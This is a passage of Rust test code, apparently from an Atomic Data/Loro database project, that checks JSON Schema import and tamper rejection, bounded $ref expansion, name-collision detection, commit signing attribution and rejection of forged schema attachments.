        .unwrap()
        .reverse();
    assert_eq!(
        serde_json::to_value(document.import().unwrap()).unwrap(),
        serde_json::to_value(&original).unwrap()
    );
    document.schema["properties"]["pitch"]["maximum"] = json!(100);
    assert!(document.import().is_err());
    let mut tampered = original.export_json_schema().unwrap();
    tampered
        .atomic
        .definitions
        .get_mut(original.property("pitch").unwrap())
        .unwrap()[crate::urls::SHORTNAME] = json!("forged");
    assert!(tampered.import().is_err());
    assert!(AppSchema::from_json_schema("open", &json!({"type":"object"})).is_err());
}

#[test]
fn json_schema_expansion_and_generated_name_collisions_are_bounded() {
    let mut defs = serde_json::Map::new();
    defs.insert("d0".into(), json!({"type":"boolean"}));
    for i in 1..13 {
        defs.insert(format!("d{i}"),json!({"type":"object","properties":{"a":{"$ref":format!("#/$defs/d{}",i-1)},"b":{"$ref":format!("#/$defs/d{}",i-1)}}}));
    }
    assert!(Shape::from_json_schema(&json!({"$defs":defs,"$ref":"#/$defs/d12"})).is_err());
    let f = || Field {
        shape: Shape::Boolean,
        required: false,
    };
    let schema = AppSchema::define(
        "names",
        [("midiKey".into(), f()), ("midi_key".into(), f())].into(),
    )
    .unwrap();
    assert!(schema
        .generate_models("ExampleModel")
        .unwrap_err()
        .to_string()
        .contains("collision"));
}

#[tokio::test]
async fn low_level_signing_preserves_genesis_and_edit_attribution() {
    use crate::{
        commit::{Commit, CommitBuilder},
        envelopes::{attribute_history, EnvelopeRetention},
        sync::engine::{ingest_commit_json, CommitIngestOpts},
        urls,
    };
    for frozen in [false, true] {
        let db = Db::init_temp("schema-signing-attribution").await.unwrap();
        db.set_envelope_retention(EnvelopeRetention::All);
        let (alice, drive) = db.setup("Alice").await.unwrap();
        let schema = audio();
        schema.register(&db).await.unwrap();
        let mut builder = CommitBuilder::new("placeholder".into());
        builder.set(urls::PARENT.into(), Value::AtomicUrl(drive.into()));
        builder.set(urls::NAME.into(), Value::String("Original".into()));
        builder.set(urls::DESCRIPTION.into(), Value::String("Remove me".into()));
        if frozen {
            builder.set(
                urls::IS_A.into(),
                Value::ResourceArray(vec![schema.class_id.clone().into()]),
            );
            builder.set(schema.property("tune").unwrap().into(), Value::Float(0.));
            builder.set(
                schema.property("envelope").unwrap().into(),
                Value::Json(json!({"attack":0.01,"release":0.2})),
            );
        }
        let genesis = Commit::create_did(builder, &alice, &db).await.unwrap();
        let doc = crate::loro::AtomicLoroDoc::from_snapshot(genesis.loro_update.as_ref().unwrap())
            .unwrap();
        assert_eq!(
            doc.get_history().last().unwrap().message.as_deref(),
            Some(alice.subject.as_str()),
            "genesis must retain creator message, frozen={frozen}"
        );
        let subject = genesis.subject.clone();
        let serialized = genesis
            .into_resource(&db)
            .await
            .unwrap()
            .to_json_ad(None)
            .unwrap();
        ingest_commit_json(&db, &serialized, &CommitIngestOpts::peer())
            .await
            .unwrap();
        for n in 0..2 {
            let resource = db.get_resource(&subject).await.unwrap();
            let mut edit = CommitBuilder::new(subject.clone());
            edit.set(urls::NAME.into(), Value::String(format!("Edit {n}")));
            edit.remove(urls::DESCRIPTION.into());
            let commit = edit.sign(&alice, &db, &resource).await.unwrap();
            let doc =
                crate::loro::AtomicLoroDoc::from_snapshot(commit.loro_update.as_ref().unwrap())
                    .unwrap();
            assert!(
                doc.get_history()
                    .iter()
                    .any(|v| v.message.as_deref().is_some_and(|m| m.starts_with("c-"))),
                "builder edit must carry a token"
            );
            let serialized = commit
                .into_resource(&db)
                .await
                .unwrap()
                .to_json_ad(None)
                .unwrap();
            ingest_commit_json(&db, &serialized, &CommitIngestOpts::peer())
                .await
                .unwrap();
        }
        let report = attribute_history(&db, subject.as_str()).await.unwrap();
        assert!(report.complete);
        assert_eq!(report.attributions.len(), 3);
        assert!(report
            .attributions
            .iter()
            .all(|a| a.verified && a.signer == alice.subject.as_str() && a.tokens.len() == 1));
        assert_ne!(report.attributions[1].tokens, report.attributions[2].tokens);
        assert_eq!(
            report.attributions[0].tokens,
            vec![alice.subject.to_string()]
        );
    }
}

#[tokio::test]
async fn schema_doc_fast_path_still_checks_classes_and_unreferenced_attachments() {
    let db = Db::init_temp("schema-attachment-gating").await.unwrap();
    let schema = audio();
    schema.register(&db).await.unwrap();
    let ordinary = crate::loro::AtomicLoroDoc::new();
    ordinary
        .set_property(crate::urls::NAME, &Value::String("ordinary".into()))
        .unwrap();
    assert!(!super::dependencies::doc_needs_schema(&ordinary));
    super::dependencies::attach_doc(&ordinary, &db)
        .await
        .unwrap();
    assert!(
        ordinary.doc().get_pending_txn_len() > 0,
        "schema no-op must not commit pending edits"
    );
    for value in [
        Value::ResourceArray(vec![schema.class_id.clone().into()]),
        Value::AtomicUrl(schema.class_id.clone().into()),
        Value::String(schema.class_id.clone()),
        Value::String(json!([schema.class_id]).to_string()),
    ] {
        let doc = crate::loro::AtomicLoroDoc::new();
        doc.set_property(crate::urls::IS_A, &value).unwrap();
        assert!(super::dependencies::doc_needs_schema(&doc));
        super::dependencies::attach_doc(&doc, &db).await.unwrap();
        assert!(!super::dependencies::read_doc(&doc).unwrap().is_empty());
        assert!(
            doc.doc().get_pending_txn_len() > 0,
            "attachment must stay in pending transaction"
        );
    }
    ordinary
        .doc()
        .get_map(super::dependencies::ROOT)
        .insert("atomic:frozen:forged", "{}")
        .unwrap();
    assert!(super::dependencies::doc_needs_schema(&ordinary));
    assert!(super::dependencies::attach_doc(&ordinary, &db)
        .await
        .is_err());
    let docless = Resource::from_propvals(
        [(
            crate::urls::LORO_UPDATE.into(),
            Value::LoroDoc(ordinary.export_snapshot()),
        )]
        .into(),
        "atomic:poisoned-docless".into(),
    );
    assert!(
        super::dependencies::resolve(&docless, &db).await.is_err(),
        "raw snapshot attachments must be checked even without visible frozen keys"
    );
}
